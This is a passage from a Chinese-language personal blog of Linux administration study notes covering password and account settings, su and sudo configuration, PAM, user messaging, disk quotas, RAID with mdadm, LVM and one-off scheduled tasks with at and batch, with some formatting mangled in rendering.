&#x27;^#&#x27;</span><br>MAIL_DIR/var/spool/mail邮箱目录<br>PASS_MAX_DAYS99999需要修改密码的日期<br>PASS_MIN_DAYS0多久不可重新设置密码的日期<br>PASS_MIN_LEN    8密码最短的字符长度(以及弃用)<br>PASS_WARN_AGE7过期警告提前日期<br>UID_MIN                  1000最小UID<br>UID_MAX                 60000最大UID<br>SYS_UID_MIN               201系统最小UID<br>SYS_UID_MAX               999系统最大UID<br>GID_MIN                  1000最小GID<br>GID_MAX                 60000最大GID<br>SYS_GID_MIN               201系统最小GID<br>SYS_GID_MAX               999系统最大GID<br>CREATE_HOME<span class="hljs-built_in">yes</span>是否创建家目录<br>UMASK           077默认权限(用最大权限删去这个就是默认权限)<br>USERGROUPS_ENAB <span class="hljs-built_in">yes</span>使用userdel删除时是否删除初始用户组(如果没有人属组与这个组就将其删除)<br>ENCRYPT_METHOD MD5密码加密方式<br>MD5_CRYPT_ENAB <span class="hljs-built_in">yes</span><br><br></code></pre></td></tr></table></figure><h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><p>修改密码的简单方式</p><blockquote><p>echo “12345” | passwd –stdin stranger</p></blockquote><p>但是 这样修改密码会留在历史记录里面</p><p>让密码具有60天修改10天后失效</p><blockquote><p>passwd -x 60 -i 10 stranger</p></blockquote><p>不让登录</p><blockquote><p>passwd -l stranger</p><p>passwd -u stranger (恢复正常)</p></blockquote><h4 id="chage"><a href="#chage" class="headerlink" title="chage"></a>chage</h4><p>查看用户密码的详细参数</p><h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p>对用户属性进行调整<a href="https://www.runoob.com/linux/linux-comm-usermod.html">https://www.runoob.com/linux/linux-comm-usermod.html</a></p><h4 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h4><p>删除用户</p><h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p>查询用户的id</p><h4 id="chfn-一般用户可以修改-x2F-etc-x2F-passwd"><a href="#chfn-一般用户可以修改-x2F-etc-x2F-passwd" class="headerlink" title="chfn(一般用户可以修改&#x2F;etc&#x2F;passwd)"></a>chfn(一般用户可以修改&#x2F;etc&#x2F;passwd)</h4><p>修改个人信息</p><h4 id="chsh-一般用户可以修改-x2F-etc-x2F-passwd"><a href="#chsh-一般用户可以修改-x2F-etc-x2F-passwd" class="headerlink" title="chsh(一般用户可以修改&#x2F;etc&#x2F;passwd)"></a>chsh(一般用户可以修改&#x2F;etc&#x2F;passwd)</h4><p>-s：设置自己的shell</p><p>chfn、chsh属于SUID</p><h3 id="su与su-的区别"><a href="#su与su-的区别" class="headerlink" title="su与su -的区别"></a>su与su -的区别</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[stranger@YH ~]$ su root<br>Password: <br>[root@YH stranger]<span class="hljs-comment"># env | grep &#x27;stranger&#x27;</span><br>USER=stranger<br>PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/stranger/.local/bin:/home/stranger/bin<br>MAIL=/var/spool/mail/stranger<br>PWD=/home/stranger<br>LOGNAME=stranger<br></code></pre></td></tr></table></figure><p>看见没纵使切换用户很多变量仍然没有读取</p><p>读取的变量方式设置为非登录shell的方式</p><p>使用su -</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[stranger@YH ~]$ su - root<br>Password: <br>Last login: Thu Sep 16 19:27:17 CST 2021 on pts/3<br>[root@YH ~]<span class="hljs-comment"># env | grep root</span><br>USER=root<br>MAIL=/var/spool/mail/root<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin<br>PWD=/root<br>HOME=/root<br>LOGNAME=root<br></code></pre></td></tr></table></figure><p>看到了吗变量变过来了</p><p>-c 用root运行一个命令</p><h4 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h4><p>只有&#x2F;etc&#x2F;sudoers内的用户才能执行&#x3D;&#x3D;要用visudo来去修改这个目录&#x3D;&#x3D;</p><p>若用户执行sudo后便让用户输入自己的密码来确认</p><p>密码输入成功才进行sudo后接命令</p><p>若切换身份到相同用户不需要密码</p><ul><li>-u [账户]:切换到账户并执行命令</li></ul><h4 id="visudo"><a href="#visudo" class="headerlink" title="visudo"></a>visudo</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH etc]<span class="hljs-comment"># cat sudoers | grep -v &#x27;^$&#x27; | grep -v &#x27;^#&#x27;</span><br>Defaults   !visiblepw<br>Defaults    always_set_home<br>Defaults    match_group_by_gid<br>Defaults    always_query_group_plugin<br>Defaults    env_reset<br>Defaults    env_keep =  <span class="hljs-string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span><br>Defaults    env_keep += <span class="hljs-string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span><br>Defaults    env_keep += <span class="hljs-string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span><br>Defaults    env_keep += <span class="hljs-string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span><br>Defaults    env_keep += <span class="hljs-string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span><br>Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin<br>rootALL=(ALL) ALL<br>%wheelALL=(ALL)ALL<br>用户账户 登陆者的主机名 可切换身份 可执行的命令<br></code></pre></td></tr></table></figure><ul><li><p>单用户可使用root命令</p><ul><li>直接修改</li></ul></li><li><p>利用wheel用户组以及免密的功能处理visudo</p><ul><li>任何加入wheel这个组的用户可以随意使用sudo当然只要修改sudoers这个表加入其他组也可以实现wheel组的效果 %后面加组名</li><li>如果要免密就要在sudoers相关行的最后加入NOPASSWD:ALL</li></ul></li><li><p>有限制的命令操作</p><ul><li><blockquote><p>userALL&#x3D;(ALL) &#x2F;usr&#x2F;bin&#x2F;passwd   &lt;==这个路径必须是绝对路径</p><p>userALL&#x3D;(ALL) &#x2F;usr&#x2F;bin&#x2F;passwd, !&#x2F;usr&#x2F;bin&#x2F;passwd root   &lt;==这个路径必须是绝对路径</p></blockquote></li></ul></li><li><p>通过别名创建</p><ul><li><p>sudoers</p></li><li><blockquote><p>User Alias ADMPW &#x3D; pro1,pro2,pro3,pro4</p><p>Cmnd Alias ADMPWCOM &#x3D; !&#x2F;usr&#x2F;bin&#x2F;passwd, &#x2F;usr&#x2F;bin&#x2F;passwd [A-Za-z]*, !&#x2F;usr&#x2F;bin&#x2F;passwd root</p><p>ADMPW ALL&#x3D;(root) ADMPWCOM </p><p>&#x2F;&#x2F;通过上面的写入将四个pro起别名并且权限也起别名进行统一管理</p></blockquote></li><li><p>别名必须全大写</p></li></ul></li><li><p>sudo的时间间隔</p><ul><li>输入了一次密码五分钟之内无需再输入就可执行sudo操作</li></ul></li><li><p>输入自己的密码进入root</p><ul><li><blockquote><p>visudo</p><p>User Alise ADMINS &#x3D; pro1,pro2</p><p>ADMINS ALL&#x3D;(root) &#x2F;bin&#x2F;su -</p></blockquote></li></ul></li></ul><h2 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h2><ul><li>groupadd :新建组</li><li>groupmod :对组进行修改</li><li>groupdel :删除组(如果有某个用户的初始组占用着该组则无论如何也无法删除)</li><li>gpasswd groupname :用户组管理员功能<ul><li>:无参是groupname密码</li><li>-A user:将管理权交给user</li></ul></li></ul><h3 id="特殊的shell-x2F-sbin-x2F-nologin"><a href="#特殊的shell-x2F-sbin-x2F-nologin" class="headerlink" title="特殊的shell,&#x2F;sbin&#x2F;nologin"></a>特殊的shell,&#x2F;sbin&#x2F;nologin</h3><p>该shell无法登录并且如果存在&#x2F;etc&#x2F;nologin.txt登录后会显示文本内的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH etc]<span class="hljs-comment"># useradd -s /sbin/nologin user4</span><br>[root@YH etc]<span class="hljs-comment"># su user4</span><br>不让登录<br>[root@YH etc]<span class="hljs-comment"># cat nologin.txt </span><br>不让登录<br></code></pre></td></tr></table></figure><h3 id="PAM-同一认证模块"><a href="#PAM-同一认证模块" class="headerlink" title="PAM 同一认证模块"></a>PAM 同一认证模块</h3><blockquote><p>PAM使用配置&#x2F;etc&#x2F;pam.d&#x2F;下的文件，来管理对程序的认证方式.应用程序 调用相应的配置文件，从而调用本地的认证模块.模块放置在&#x2F;lib&#x2F;security下，以加载动态库的形式进，像我们使用su命令时，系统会提示你输入root用户的密码.这就是su命令通过调用PAM模块实现的。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH pam.d]<span class="hljs-comment"># ls</span><br>atd          fingerprint-auth     password-auth     remote          smartcard-auth-ac  sudo            systemd-user<br>chfn         fingerprint-auth-ac  password-auth-ac  runuser         smtp               sudo-i          vlock<br>chsh         login                polkit-1          runuser-l       smtp.postfix       su-l<br>config-util  other                postlogin         setup           sshd               system-auth<br>crond        passwd               postlogin-ac      smartcard-auth  su                 system-auth-ac<br>[root@YH pam.d]<span class="hljs-comment"># cat passwd</span><br><span class="hljs-comment">#%PAM-1.0</span><br>auth       includesystem-auth<br>account    includesystem-auth<br>password   substacksystem-auth<br>-password   optionalpam_gnome_keyring.so use_authtok<br>password   substackpostlogin<br></code></pre></td></tr></table></figure><ul><li>一共有三个字段<ul><li>第一个字段验证类别<ul><li>auth:主要用来检验用户的身份,这种类别通常是需要密码来验证</li><li>account:验证用户是否具有权限</li><li>session:这次登录期间的会话管理,记录用户的登录注销</li><li>password:用于认证修订,例如修改密码</li><li>这四种一般是有顺序的</li></ul></li><li>第二个字段控制标准<ul><li>required:不论成功还是结束都会执行后续,例如日志</li><li>requisite:若验证失败则立刻返回源程序的failure标志,并种终止后续的验证流程</li><li>sufficient:若成功则立刻返回success给源程序并终止后续的认证流程</li><li>optional:大多数用于显示信息不用于认证</li><li>include代表认证交给后面的文件作为这个类别的认证</li></ul></li></ul></li><li>PAM流程:<ul><li>使用passwd进行介绍</li><li>用户开始执行PAM模块</li><li>passwd调用PAM进行验证</li><li>PAM到&#x2F;etc&#x2F;pam.d中找到与程序同名的配置文件</li><li>根据文件内的配置进行设置</li><li>验证结果返回</li><li>passwd返回的结果进行下一步</li></ul></li><li>PAM常用模块<a href="https://blog.csdn.net/weixin_34311757/article/details/92873089">https://blog.csdn.net/weixin_34311757/article/details/92873089</a><ul><li>&#x2F;etc&#x2F;pam.d&#x2F;*:每个程序的PAM配置文件</li><li>&#x2F;lib64&#x2F;security&#x2F;*:PAM模块文件的实际放置目录</li><li>&#x2F;etc&#x2F;security&#x2F;*:其他PAM环境的配置文件</li><li>&#x2F;usr&#x2F;share&#x2F;doc&#x2F;pam-*&#x2F;:详细的PAM说明文件</li><li>limits.conf系统管理员可以使用这个账户统一管理,对于已经登录的用户无效</li><li>&#x2F;var&#x2F;log&#x2F;secure :记录模块发生的问题</li><li>&#x2F;var&#x2F;log&#x2F;messages:记录模块发生的问题</li></ul></li></ul><h2 id="有关用户"><a href="#有关用户" class="headerlink" title="有关用户"></a>有关用户</h2><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><ul><li>w</li><li>who</li><li>last</li><li>lastlog</li></ul><h3 id="用户对谈"><a href="#用户对谈" class="headerlink" title="用户对谈"></a>用户对谈</h3><ul><li><p>write</p><ul><li><p>root</p></li><li><pre><code class="bash">[root@YH pam.d]# whoroot     pts/0        2021-09-17 09:41 (153.118.189.29)stranger pts/1        2021-09-17 10:48 (153.118.189.29)[root@YH pam.d]# write stranger aaawrite: stranger is not logged in on aaa[root@YH pam.d]# write stranger pts/2write: stranger is not logged in on pts/2[root@YH pam.d]# write stranger pts/1helloaiMessage from stranger@YH on pts/1 at 10:50 ...nixiangganma^[[D^[[D<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><br>  <br><br>- stranger<br><br>- ```bash<br>  [stranger<span class="hljs-variable">@YH</span> ~]<span class="hljs-variable">$ </span><br>  <span class="hljs-title class_">Message</span> from root<span class="hljs-variable">@YH</span> on pts/<span class="hljs-number">0</span> at <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">49</span> ...<br>  hello<br>  ^C<br>  [stranger<span class="hljs-variable">@YH</span> ~]<span class="hljs-variable">$ </span>ai<br>  <br>  [stranger<span class="hljs-variable">@YH</span> ~]<span class="hljs-variable">$ </span><br>  [stranger<span class="hljs-variable">@YH</span> ~]<span class="hljs-variable">$ </span>write root pst/<span class="hljs-number">0</span><br>  <span class="hljs-symbol">write:</span> root is <span class="hljs-keyword">not</span> logged <span class="hljs-keyword">in</span> on pst/<span class="hljs-number">0</span><br>  [stranger<span class="hljs-variable">@YH</span> ~]<span class="hljs-variable">$ </span>who<br>  root     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-17</span> <span class="hljs-number">09</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> (<span class="hljs-number">153.118</span>.<span class="hljs-number">189.29</span>)<br>  stranger pts/<span class="hljs-number">1</span>        <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-17</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">48</span> (<span class="hljs-number">153.118</span>.<span class="hljs-number">189.29</span>)<br>  [stranger<span class="hljs-variable">@YH</span> ~]<span class="hljs-variable">$ </span>write root pts/<span class="hljs-number">0</span><br>  nixiangganma^[[D^[[D<br>  <br></code></pre></td></tr></table></figure></code></pre></li><li></li></ul></li><li><p>mesg:使用mesg n可以不接受write的消息但是如果对方是root则强制手下</p></li><li><p>wall</p></li></ul><h3 id="检查账号"><a href="#检查账号" class="headerlink" title="检查账号"></a>检查账号</h3><ul><li>pwck:用于检查&#x2F;etc&#x2F;passwd</li><li>pwconv:将&#x2F;etc&#x2F;passwd中的账号密码移动到&#x2F;etc&#x2F;shadow中</li><li>chpasswd:读入未加密的数据进行加密后写入&#x2F;etc&#x2F;shadow</li></ul><blockquote><p>创建大量账号模板passwd –stdin</p><p>还需要一个shell脚本</p></blockquote><h2 id="磁盘配额"><a href="#磁盘配额" class="headerlink" title="磁盘配额"></a>磁盘配额</h2><p>注意以下几点:</p><ul><li>ext文件系统只能针对整个文件系统设置磁盘配额</li><li>xfs可以使用project能够针对目录进行配额</li><li>内核必须支持磁盘配额(Centos7默认支持并开启)</li><li>Centos默认开启SELinux,由于SELinux的限制只能配置&#x2F;home的额度</li><li>不同的文件下系统有着不同的限额方式,限额之前必须知道文件系统</li><li>xfs可以针对下面的几部分进行配额:<ul><li>分别对用户、用户组或个别目录进行配置</li><li>容量限制或文件数量限制</li><li>限制inode使用量:管理用户可以建立的[文件数量]</li><li>限制block使用量:管理磁盘容量</li><li>软硬限制(不是软连接和硬链接)<ul><li>hard:用户绝不能超过这个值,超过则会锁定用户的磁盘使用权</li><li>soft:表示用户低于时可以正常使用如果超过这个值,系统会在用户登录时进行警告并给予宽限时间,如果用户在这段时间内没有把容量降低到soft以下则将hard的值降低到soft</li></ul></li></ul></li></ul><h4 id="配额测试"><a href="#配额测试" class="headerlink" title="配额测试"></a>配额测试</h4><p>进行操作时最好注销所有用户,并且不能有语法错误否则可能导致无法正常启动</p><p>​过去版本通常使用mount -o remount 进行重新挂载开启磁盘配额功能</p><p>​但是xfs似乎在挂载之初就声明了配额功能所有要修改&#x2F;etc&#x2F;fstab编辑该文件并在defaults后加入,usrquota,grpquota</p><p>配额选项有以下三种:</p><ul><li>uquota&#x2F;usrquota&#x2F;quota:针对账号</li><li>gquota&#x2F;grpquota:针对组</li><li>pquota&#x2F;prjquota:针对单一目录的设置,不可与grpquota同时存在</li></ul><p>磁盘配额命令quote</p><ul><li>xfs_quote -x -c “命令” [挂载点]</li><li>-x:专家模式</li><li>-c:后面要接命令</li><li>命令 <ul><li>print:打印信息</li><li>df:与df一样</li><li>report:列出目前的磁盘配额</li><li>state:目前支持磁盘配额的文件系统信息</li></ul></li></ul><h2 id="软件磁盘阵列"><a href="#软件磁盘阵列" class="headerlink" title="软件磁盘阵列"></a>软件磁盘阵列</h2><p>磁盘阵列就是将多个较小的磁盘组成一个较大的磁盘设备，使用RAID可以将这些设备视为一个整体，一共有五个模式</p><ul><li>RAID 0(等量模式):性能最佳<ul><li>将所有的数据进行分块写入不同的磁盘,这样读写速度快但是一旦有一块磁盘损害都可能造成数据的大量丢失</li></ul></li><li>RAID 1(镜像模式):完全备份<ul><li>同一份数据保存在两个磁盘上</li></ul></li><li>RAID 1+0,RAID 0+1(推荐1+0,因为这样磁盘越多速度越快)<ul><li>可以先将数据进行分块再将数据分别复制,并将原数据与复制数据一起写入,如下图:</li><li><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210922093728257.png" alt="image-20210922093728257"></li></ul></li><li>RAID 5:性能与数据备份的均衡考虑<ul><li>需要三个以上的磁盘</li><li>采用RAID 0 的方式写入但是会进行奇偶校验将校验的结果放在不同盘,因此总体容量会少一块磁盘因为要放校验数据,如果一个磁盘损坏可以使用校验值来进行修复但是如果&#x3D;&#x3D;两个或以上损坏则无法恢复&#x3D;&#x3D;</li></ul></li><li>RAID 6:和5一样的做法但是使用两个磁盘作为奇偶校验结果,因此保证两个磁盘数据恢复</li></ul><blockquote><p>关于磁盘阵列的热备份(最好支持热插拔)</p><p>举个例子如果我安装了10快磁盘但是只用9块,某天系统发现其中一块损坏会将数据备份到那个没用到的磁盘上</p></blockquote><ul><li>优点:数据的可靠性与速度,容量得到提升</li></ul><table><thead><tr><th></th><th>RAID 0</th><th>RAID 1</th><th>RAID 1 0</th><th>RAID 5</th><th>RAID 6</th></tr></thead><tbody><tr><td>最少磁盘数</td><td>2</td><td>2</td><td>4</td><td>3</td><td>4</td></tr><tr><td>最大容错数量(数据恢复)</td><td>无</td><td>n-1</td><td>n&#x2F;2</td><td>1</td><td>2</td></tr><tr><td>安全性</td><td>无</td><td>最好</td><td>最好</td><td>好</td><td>好</td></tr><tr><td>写入性能</td><td>n</td><td>1</td><td>n&#x2F;2</td><td>&lt;n-1</td><td>&lt;n-2</td></tr><tr><td>读出性能</td><td>n</td><td>n</td><td>n</td><td>&lt;n-1</td><td>&lt;n-2</td></tr><tr><td>可用容量</td><td>n</td><td>1</td><td>n&#x2F;2</td><td>n-1</td><td>n-2</td></tr><tr><td>应用</td><td>速度,不备份</td><td>数据备份</td><td>服务器、云系统</td><td>数据备份</td><td>数据备份</td></tr></tbody></table><p>&#x3D;&#x3D;磁盘阵列的设备名为&#x2F;dev&#x2F;sd[a-p]&#x3D;&#x3D;</p><p>软件磁盘阵列因为是系统模拟的所有名字为&#x2F;dev&#x2F;md[0-9]</p><h4 id="使用mdadm-进行软件磁盘阵列设置"><a href="#使用mdadm-进行软件磁盘阵列设置" class="headerlink" title="使用mdadm 进行软件磁盘阵列设置"></a>使用mdadm 进行软件磁盘阵列设置</h4><p>mdadm –create &#x2F;dev&#x2F;md[0-9] –auto&#x3D;yes –level&#x3D;[015] –chunk&#x3D;NK –raid-devices&#x3D;N –spare-devices&#x3D;N 设备名</p><ul><li>设备名可以是磁盘也可以是分区但这些设备名总数加起来要 等于 –raid-devices&#x3D;N –spare-devices&#x3D;N这俩加起来的数量</li><li>–create 建立RAID</li><li>–auto&#x3D;yes</li><li>–chunk&#x3D;NK 决定这个磁盘的chunk大小,也可以当成stripe大小,一般是64K或512K</li><li>–raid-devices&#x3D;N 使用几个磁盘分区</li><li>–spare-devices&#x3D;N 使用几个磁盘作为备用磁盘(热备份)</li><li>–level&#x3D;[015] 就是RAID 0,RAID 1,RAID 5这三个模式</li><li>–detail 列出设备的详细信息</li></ul><p>进行恢复</p><ul><li>–manage 设备<ul><li>–add 设备:添加设备到md</li><li>–remove 设备:将设备从md删除</li><li>–fail :将设备设为出错</li></ul></li></ul><p>使用软件进行阵列设置后还能使用mkfs.xfs对虚拟后的&#x2F;dev&#x2F;md0(这个根据需求选择)进行格式化</p><p>mdadm的配置文件&#x2F;etc&#x2F;mdadm.conf</p><h3 id="RAID默认是自动开启且挂载如果不想用了需要关闭RAID"><a href="#RAID默认是自动开启且挂载如果不想用了需要关闭RAID" class="headerlink" title="RAID默认是自动开启且挂载如果不想用了需要关闭RAID"></a>RAID默认是自动开启且挂载如果不想用了需要关闭RAID</h3><h2 id="逻辑卷管理器"><a href="#逻辑卷管理器" class="headerlink" title="逻辑卷管理器"></a>逻辑卷管理器</h2><h4 id="建立LVM流程"><a href="#建立LVM流程" class="headerlink" title="建立LVM流程"></a>建立LVM流程</h4><ul><li><p>进行分区并将system ID设为8e</p></li><li><p>PV阶段</p><ul><li>pvcreate:将分区建为PV</li><li>pvscan:扫描系统里面所有的PV磁盘</li><li>pvdisplay:显示出系统上面PV状态</li><li>pvremove:将PV属性删除</li></ul></li><li><p>建立VG阶段</p><ul><li>vgcreate:建立VG命令</li><li>vgscan:检查VG是否存在</li><li>vgdisplay:显示VG状态</li><li>vgextend:再VG内增加PV</li><li>vgreduce:在VG内删除PV</li><li>vgchange:设置VG是否启动</li><li>vgremove:删除一个VG</li></ul></li><li><p>LV阶段</p><ul><li>lvcreate:建立LV</li><li>lvscan:查询系统上面的LV</li><li>lvdisplay:查看LV状态</li><li>lvextend:给LV增加容量</li><li>lvreduce:在LV里面减少容量</li><li>lvremove:删除LV</li><li>lvresize:重新调整大小</li></ul></li><li><p>对LV进行格式化</p></li></ul><p>剩下的操作还有扩大LV容量,让LVM具有自动调整功能,创建快照,关闭与开启LVM</p><h4 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h4><p>可以直接使用lvresize -L +500M LV分区(使用vgdisplay vg分区 ,来查看) 来进行直接分区</p><p>使用这个方法vg必须有剩余的空间,扩容完毕后使用xfs_growfs &#x2F;srv&#x2F;lvm进行更新</p><p>&#x3D;&#x3D;xfs只能放大,ext4能放大能缩小&#x3D;&#x3D;</p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>Linux常见的计划任务有</p><ul><li><p>日志的轮询(logrotate):由于日志会越来越大大型文件不但占容量还会影响读写,所有有时候需要将新数据与旧数据分开存放</p></li><li><p>日志文件分析(logwatch):由于日志文件很乱所有一般不用vim等去查看而是使用logwatch查看登录信息</p></li><li><p>建立locate数据库:存储已经存在的文件名,存放在&#x2F;var&#x2F;lib&#x2F;mlocate,通过update自动更新</p></li><li><p>manpage查询数据库:和locate类似,提供快速查询,需要执行mandb才能创建通过系统计划任务来自动执行</p></li><li><p>RPM软件日志,用来跟踪软件</p></li><li><p>删除缓存(tmpwatch)</p></li><li><p>与网络有关的分析例如apache</p></li></ul><p>有很多软件也会自动添加计划任务</p><h3 id="只执行一次的任务"><a href="#只执行一次的任务" class="headerlink" title="只执行一次的任务"></a>只执行一次的任务</h3><p>首先我们需要开启单一计划服务atd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># systemctl restart atd</span><br>[root@YH ~]<span class="hljs-comment"># systemctl enable atd</span><br>[root@YH ~]<span class="hljs-comment"># systemctl status atd</span><br>● atd.service - Job spooling tools<br>   Loaded: loaded (/usr/lib/systemd/system/atd.service; enabled; vendor preset: enabled)<br>   Active: active (running) since Wed 2021-09-22 12:27:24 CST; 20s ago<br> Main PID: 10183 (atd)<br>   CGroup: /system.slice/atd.service<br>           └─10183 /usr/sbin/atd -f<br><br>Sep 22 12:27:24 YH systemd[1]: Started Job spooling tools.<br></code></pre></td></tr></table></figure><p>必须enable和running才是真正的启动了</p><ul><li><p>at</p><ul><li><p>实际上我们使用at是以文本方式写入&#x2F;var&#x2F;spool&#x2F;at&#x2F;目录里面</p></li><li><p>但是由于这个命令可能很危险所有会有&#x2F;etc&#x2F;at.allow与&#x2F;etc&#x2F;at.deny来实现对at的限制</p><ul><li>系统会先找at.allow这个文件,没有在这个文件的用户都不能使用at,如果不存在才会区查询at.deny</li><li>如果两个文件都不存在那么只有root才能使用</li></ul></li><li><p>at [-mldv] 时间</p><ul><li><p>-m:即使没有输出信息,亦发email通知使用者</p></li><li><p>-l:相当于atq,列出所有该使用者的计划</p></li><li><p>-d:相当于atrm,取消一个计划</p></li><li><p>-v:可以使用较明显的时间格式列出at</p></li><li><p>-c:可以列出后面接的任务实际命令内容</p></li><li><p>时间</p><ul><li>HH:MM 今天的某一时刻</li><li>HH:MM YYYY-MM-DD:某一天执行</li></ul></li><li><p>&#96;&#96;&#96;bash<br>[root@YH ~]# at now + 5 minutes<br>at&gt; &#x2F;bin&#x2F;mail -s “”^[[D^H<br>at&gt; ^[[A<br>at&gt; &#x2F;bin&#x2F;mail -s “testing at job” root &lt; &#x2F;root&#x2F;.bashrc<br>at&gt; <EOT><br>job 1 at Wed Sep 22 13:55:00 2021<br>[root@YH ~]# at -l<br>1Wed Sep 22 13:55:00 2021 a root<br>[root@YH ~]# at -c 1<br>……省略<br>cd &#x2F;root || {<br> echo ‘Execution directory inaccessible’ &gt;&amp;2<br> exit 1<br>}<br>${SHELL:-&#x2F;bin&#x2F;sh} &lt;&lt; ‘marcinDELIMITER671da34f’<br>&#x2F;bin&#x2F;mail -s “”<br>&#x2F;bin&#x2F;mail -s “testing at job” root &lt; &#x2F;root&#x2F;.bashrc</EOT></p><p>marcinDELIMITER671da34f</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>  - 如果你要定时用echo发送给终端是直接无法发送因为at与用户使用的终端无关所以要使用echo <span class="hljs-string">&quot;hello&quot;</span>&gt;/dev/tty1来代替<br><br>- batch:系统有时间才执行命令,cpu负载数小于<span class="hljs-number">0.8</span>,时才执行(cpu负载数量单一时间负责的任务数量)每分钟检查一次<br><br>  - 可以使用这些命令来配合查看<br><br>  - uptime查看平均任务负载<br><br>  - jobs查看已挂载的程序,不用携带任何参数<br><br>  - ```bash<br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># echo &quot;scale=100000; 4*a(1)&quot; | bc -lq &amp;</span><br>    [<span class="hljs-meta">1</span>] <span class="hljs-number">25512</span><br>    You have mail <span class="hljs-keyword">in</span> /<span class="hljs-keyword">var</span>/spool/mail/root<br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># echo &quot;scale=100000; 4*a(1)&quot; | bc -lq &amp;</span><br>    [<span class="hljs-meta">2</span>] <span class="hljs-number">25531</span><br>    [<span class="hljs-meta">root@YH dev</span>]<span class="hljs-meta"># echo &quot;scale=100000; 4*a(1)&quot; | bc -lq 